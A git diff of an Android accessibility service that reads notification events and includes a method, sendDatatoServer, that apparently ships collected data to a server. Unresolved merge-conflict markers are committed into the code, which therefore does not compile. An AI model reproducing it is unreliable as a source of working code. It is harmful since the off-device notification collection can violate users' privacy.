@@ -32,8 +32,17 @@ public class MyAccessibilityService extends AccessibilityService {
             Log.d("nodeinfo", "Error: " + e.getMessage());
         }
 
+<<<<<<< HEAD
         if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             handleNotificationStateChanged(event);
+=======
+        switch (eventType) {
+            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
+                handleNotificationStateChanged(event);
+                break;
+            default:
+                break;
+>>>>>>> 2177836b93b2d967664be7125feed15f4443cd8c
         }
     }
 
@@ -72,6 +81,7 @@ public class MyAccessibilityService extends AccessibilityService {
         return str == null || str.length() == 0;
     }
 
+<<<<<<< HEAD
     private void sendDatatoServer(Set<String> data){
         new Thread(() -> {
             try {
@@ -101,6 +111,8 @@ public class MyAccessibilityService extends AccessibilityService {
         }).start();
     }
 
+=======
+>>>>>>> 2177836b93b2d967664be7125feed15f4443cd8c
     private void handleNotificationStateChanged(AccessibilityEvent event) {
         Parcelable parcelable = event.getParcelableData();
         if (parcelable instanceof Notification) {
